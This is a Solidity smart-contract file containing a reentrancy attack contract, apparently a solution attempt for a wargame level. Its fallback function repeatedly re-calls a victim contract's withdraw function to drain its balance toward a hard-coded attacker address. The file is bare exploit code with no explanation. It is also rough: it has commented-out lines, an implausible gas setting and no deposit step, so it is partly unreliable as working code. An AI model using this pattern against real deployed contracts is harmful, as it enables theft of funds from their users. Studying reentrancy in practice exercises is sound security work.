// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IReentrance} from "./IReentrance.sol";

contract ReentranceAttack {
  IReentrance private immutable victimContract;
  address private attackerAddress = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  event LOG_BALANCE(address sender, uint256 value);
  event LOG_ATTACK(address sender, uint256 value);
  event LOG_BYTES(address sender, bytes datas);
  event LOG_ATTACK_MESSAGE(address sender, uint256 _amount, uint256 gas, string message);

  uint8 private index = 1;

  constructor(IReentrance instance_) {
    victimContract = instance_;
  }

  function trigWithdraw() external {
    (bool success, bytes memory data) = address(victimContract).call{value: 0, gas: 2000000}(
      abi.encodeWithSignature("withdraw(uint256)", 1e15)
    );
  }

  fallback() external payable {
    if (address(victimContract).balance >= 1e15) {
      emit LOG_BALANCE({sender: msg.sender, value: address(victimContract).balance});
      // if (index >= 1) return;

      // if (address(victimContract).balance > 0) {
      if (index <= 1) {
        (bool success, bytes memory data) = address(victimContract).call{gas: 1e15}(abi.encodeWithSignature("withdraw(uint256)", 1e15));
        emit LOG_ATTACK({sender: msg.sender, value: gasleft()});
        // victimContract.withdraw(1e15);
        // emit LOG_BYTES({sender: msg.sender, datas: data});
        ++index;
      }
    }
  }
}
